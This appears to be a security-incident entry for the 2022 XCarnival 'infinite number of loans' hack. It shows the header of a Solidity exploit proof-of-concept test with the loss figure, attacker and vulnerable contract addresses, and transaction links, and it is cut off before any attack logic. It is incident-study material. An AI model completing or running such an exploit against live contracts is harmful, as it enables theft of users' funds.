# [?] XCarnival - Infinite Number of Loans

## Summary
Severity: Unknown
Chain: Ethereum
Component: XCarnival
Published: 2022-06-26
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-06/XCarnival_exp.sol
Type: defi-exploit-poc

## Details
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo
// Total Lost : 3087 ETH (~3,870,000 US$)
// Attacker Wallet : 0xb7cbb4d43f1e08327a90b32a8417688c9d0b800a
// Main Attack Contract : 0xf70f691d30ce23786cfb3a1522cfd76d159aca8d
// Vulnerable Contract XNFT.sol : https://etherscan.io/address/0x39360ac1239a0b98cb8076d4135d0f72b7fd9909#code

// @Info
// XToken.sol : https://etherscan.io/address/0x5417da20ac8157dd5c07230cfc2b226fdcfc5663#code
// Proxy of XNFT.sol : 0xb14B3b9682990ccC16F52eB04146C3ceAB01169A
// P2Controller.sol : https://etherscan.io/address/0x34ca24ddcdaf00105a3bf10ba5aae67953178b85#code
// BAYC Contract: 0xbc4ca0eda7647a8ab7c2061c2e118a18a936f13d

// @News
// Official Announce : https://twitter.com/XCarnival_Lab/status/1541226298399653888
// PeckShield Alert Thread : https://twitter.com/peckshield/status/1541047171453034501
// Blocksec Alert Thread : https://twitter.com/BlockSecTeam/status/1541070850505723905

// @Shortcuts
/*
  Attacker Tx List : https://etherscan.io/txs?a=0xb7cbb4d43f1e08327a90b32a8417688c9d0b800a
    First `0xadf6a75d` call : https://etherscan.io/tx/0x422e7b0a449deba30bfe922b5c34282efbdbf860205ff04b14fd8129c5b91433
    First `Start` call : https://etherscan.io/tx/0xabfcfaf3620bbb2d41a3ffea6e31e93b9b5f61c061b9cfc5a53c74ebe890294d*/

interface IBAYC {
    function setApprovalForAll(address operator, bool _approved) external;

    function transferFrom(address from, address to, uint256 tokenId) external;

    function ownerOf(
        uint256 tokenId
    ) external view returns (address owner);
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-06/XCarnival_exp.sol_
